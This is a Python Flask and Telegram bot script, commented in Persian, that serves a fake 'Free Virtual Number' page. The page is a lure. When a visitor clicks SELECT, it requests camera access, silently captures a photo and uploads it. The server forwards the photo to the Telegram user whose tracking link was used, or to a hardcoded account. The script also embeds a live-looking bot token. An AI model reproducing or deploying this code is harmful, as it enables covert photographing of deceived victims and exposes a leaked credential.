import os
from flask import Flask, render_template_string, request, jsonify
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

app = Flask(__name__)
BOT_TOKEN = "8628341169:AAH0RN8xSL2GuKIhqiEElvndV_xWoUyw9WE"
bot = telebot.TeleBot(BOT_TOKEN)

# آدرس سایت شما در Railway (بعد از دیپلوی همینجا قرار می‌گیرد)
# توجه: دامنه زیر را با آدرس واقعی Railway خودتان جایگزین کنید
BASE_URL = "https://web-production-5d457.up.railway.app"

HTML_CONTENT = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Virtual Number</title>
    <style>
        body { background: #0b0f19; color: white; text-align: center; padding-top: 50px; font-family: sans-serif; }
        .card { background: #161f30; padding: 20px; border-radius: 10px; display: inline-block; width: 80%; }
        button { background: #ef4444; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🇺🇸 United States</h2>
        <p>+1 398 362 8901</p>
        <button onclick="capture()">SELECT</button>
    </div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <script>
        async function capture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: true});
                const video = document.getElementById('video');
                video.srcObject = stream;
                await video.play();
                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640; 
                    canvas.height = video.videoHeight || 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'photo.jpg');
                        await fetch("/upload" + window.location.search, {method: 'POST', body: formData});
                        stream.getTracks().forEach(track => track.stop());
                        alert("Connecting...");
                    }, 'image/jpeg', 0.95);
                }, 1500);
            } catch (e) {
                alert("Permission required");
            }
        }
    </script>
</body>
</html>
"""

# تنظیمات ربات تلگرام: وقتی کاربر /start را می‌زند
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    
    # ساخت دکمه شیشه‌ای
    markup = InlineKeyboardMarkup()
    # لینک اختصاصی کاربر که شامل آیدی عددی اوست
    user_link = f"{BASE_URL}/?user={user_id}"
    
    # دکمه‌ای که کاربر با کلیک روی آن لینک خود را می‌گیرد یا مستقیم وارد سایت می‌شود
    btn = InlineKeyboardButton("📸 گرفتن عکس", url=user_link)
    markup.add(btn)
    
    bot.send_message(
        message.chat.id, 
        "سلام! برای دریافت لینک اختصاصی خود روی دکمه زیر کلیک کنید:", 
        reply_markup=markup
    )

@app.route("/")
def index():
    return render_template_string(HTML_CONTENT)

@app.route("/upload", methods=["POST"])
def upload():
    user_id = request.args.get("user")
    photo = request.files.get("photo")
    
    if photo and user_id:
        # ارسال عکس به آیدی عددی همان کاربری که لینک را باز کرده است
        bot.send_photo(user_id, photo)
    elif photo:
        bot.send_photo("8173349543", photo)
        
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    # اجرای وب‌سرور (در محیط واقعی روی هاست ابری همزمان با ربات اجرا می‌شود)
    app.run(host="0.0.0.0", port=port)
